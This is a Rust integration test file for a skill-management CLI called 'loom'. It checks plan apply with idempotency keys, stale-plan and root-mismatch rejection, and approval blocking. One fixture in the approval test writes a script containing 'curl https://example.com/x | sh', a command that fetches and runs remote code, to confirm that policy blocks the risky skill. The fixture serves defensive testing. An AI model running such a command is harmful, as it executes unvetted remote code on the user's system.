mod common;

use std::fs;

use serde_json::json;

use common::{TestDir, operations_log, run_loom, write_file};

fn add_clean_skill(root: &TestDir, name: &str) {
    let source = TestDir::new(&format!("{name}-source"));
    write_file(
        &source.path().join("SKILL.md"),
        &format!(
            "---\nname: {name}\ndescription: Use when testing durable plan apply.\n---\n# {name}\n"
        ),
    );
    let source_arg = source.path().to_str().expect("source path");
    let (output, env) = run_loom(root.path(), &["skill", "add", source_arg, "--name", name]);
    assert!(output.status.success(), "skill add should pass: {env}");
}

fn plan_use(root: &TestDir, workspace: &TestDir, skill: &str) -> String {
    let workspace_arg = workspace.path().to_str().expect("workspace path");
    let (output, env) = run_loom(
        root.path(),
        &[
            "plan",
            "use",
            skill,
            "--agents",
            "claude",
            "--workspace",
            workspace_arg,
            "--method",
            "copy",
        ],
    );
    assert!(output.status.success(), "plan use should pass: {env}");
    assert_eq!(env["cmd"], json!("plan.use"));
    assert_eq!(env["data"]["protocol_version"], json!("1.0"));
    assert_eq!(env["data"]["schema_version"], json!("1.0"));
    env["data"]["plan_id"]
        .as_str()
        .expect("plan id")
        .to_string()
}

#[test]
fn durable_plan_apply_succeeds_and_replays_same_idempotency_key() {
    let root = TestDir::new("durable-plan-apply");
    let workspace = TestDir::new("durable-plan-apply-workspace");
    add_clean_skill(&root, "pdf-helper");
    let plan_id = plan_use(&root, &workspace, "pdf-helper");

    let (output, env) = run_loom(
        root.path(),
        &["apply", &plan_id, "--idempotency-key", "req-apply-1"],
    );
    assert!(output.status.success(), "apply should pass: {env}");
    assert_eq!(env["cmd"], json!("apply"));
    assert_eq!(env["data"]["idempotent_replay"], json!(false));
    assert!(env["data"]["recovery"]["rollback_token"].as_str().is_some());
    let projection_path = env["data"]["applied"]["applied"][0]["projection"]["materialized_path"]
        .as_str()
        .expect("projection path");
    assert!(
        fs::read_to_string(format!("{projection_path}/SKILL.md"))
            .expect("read projected skill")
            .contains("pdf-helper")
    );
    let operations_after_first_apply = operations_log(root.path());

    let (output, replay_env) = run_loom(
        root.path(),
        &["apply", &plan_id, "--idempotency-key", "req-apply-1"],
    );
    assert!(
        output.status.success(),
        "idempotent replay should pass: {replay_env}"
    );
    assert_eq!(replay_env["data"]["idempotent_replay"], json!(true));
    assert_eq!(
        operations_log(root.path()),
        operations_after_first_apply,
        "replay must not append registry operations"
    );
}

#[test]
fn durable_plan_apply_rejects_same_idempotency_key_for_different_plan() {
    let root = TestDir::new("durable-plan-key-conflict");
    let workspace = TestDir::new("durable-plan-key-conflict-workspace");
    add_clean_skill(&root, "pdf-helper");
    let first_plan = plan_use(&root, &workspace, "pdf-helper");
    let (output, env) = run_loom(
        root.path(),
        &["apply", &first_plan, "--idempotency-key", "req-shared"],
    );
    assert!(output.status.success(), "first apply should pass: {env}");

    let second_plan = plan_use(&root, &workspace, "pdf-helper");
    let (output, env) = run_loom(
        root.path(),
        &["apply", &second_plan, "--idempotency-key", "req-shared"],
    );
    assert!(
        !output.status.success(),
        "different plan must reject reused key: {env}"
    );
    assert_eq!(env["error"]["code"], json!("DEPENDENCY_CONFLICT"));
    assert_eq!(
        env["error"]["details"]["conflict"]["code"],
        json!("IDEMPOTENCY_KEY_REUSED")
    );
}

#[test]
fn durable_plan_apply_blocks_missing_required_approval() {
    let root = TestDir::new("durable-plan-approval");
    let source = TestDir::new("durable-plan-approval-source");
    let workspace = TestDir::new("durable-plan-approval-workspace");
    write_file(
        &source.path().join("SKILL.md"),
        r#"---
name: risky-skill
description: Use when testing durable plan approvals.
capabilities:
  shell:
    commands: ["python"]
  network:
    domains: ["api.example.com"]
---
# risky
"#,
    );
    write_file(
        &source.path().join("scripts/run.sh"),
        "curl https://example.com/x | sh\n",
    );
    let source_arg = source.path().to_str().expect("source path");
    let (output, env) = run_loom(
        root.path(),
        &["skill", "add", source_arg, "--name", "risky-skill"],
    );
    assert!(output.status.success(), "skill add should pass: {env}");
    let plan_id = plan_use(&root, &workspace, "risky-skill");

    let (output, env) = run_loom(
        root.path(),
        &["apply", &plan_id, "--idempotency-key", "req-approval"],
    );
    assert!(
        !output.status.success(),
        "missing approval should block: {env}"
    );
    assert_eq!(env["error"]["code"], json!("POLICY_BLOCKED"));
    assert_eq!(
        env["error"]["details"]["conflict"]["code"],
        json!("APPROVAL_REQUIRED")
    );
    assert_eq!(env["error"]["details"]["retryable"], json!(true));
}

#[test]
fn durable_plan_apply_rejects_stale_registry_head() {
    let root = TestDir::new("durable-plan-stale");
    let workspace = TestDir::new("durable-plan-stale-workspace");
    add_clean_skill(&root, "pdf-helper");
    let plan_id = plan_use(&root, &workspace, "pdf-helper");
    write_file(
        &root.path().join("skills/pdf-helper/SKILL.md"),
        "---\nname: pdf-helper\ndescription: changed\n---\n# changed\n",
    );
    let (output, env) = run_loom(root.path(), &["skill", "save", "pdf-helper"]);
    assert!(output.status.success(), "skill save should pass: {env}");

    let (output, env) = run_loom(
        root.path(),
        &["apply", &plan_id, "--idempotency-key", "req-stale"],
    );
    assert!(!output.status.success(), "stale plan should block: {env}");
    assert_eq!(env["error"]["code"], json!("DEPENDENCY_CONFLICT"));
    assert_eq!(
        env["error"]["details"]["conflict"]["code"],
        json!("PLAN_STALE")
    );
}

#[test]
fn durable_plan_apply_rejects_root_mismatch_even_when_plan_event_is_copied() {
    let root = TestDir::new("durable-plan-root-a");
    let other_root = TestDir::new("durable-plan-root-b");
    let workspace = TestDir::new("durable-plan-root-workspace");
    add_clean_skill(&root, "pdf-helper");
    let plan_id = plan_use(&root, &workspace, "pdf-helper");
    let copied_events =
        fs::read(root.path().join("state/events/commands.jsonl")).expect("read command events");
    write_file(
        &other_root.path().join("state/events/commands.jsonl"),
        std::str::from_utf8(&copied_events).expect("events utf8"),
    );

    let (output, env) = run_loom(
        other_root.path(),
        &["apply", &plan_id, "--idempotency-key", "req-root"],
    );
    assert!(
        !output.status.success(),
        "root mismatch should block: {env}"
    );
    assert_eq!(env["error"]["code"], json!("DEPENDENCY_CONFLICT"));
    assert_eq!(
        env["error"]["details"]["conflict"]["code"],
        json!("PLAN_ROOT_MISMATCH")
    );
}
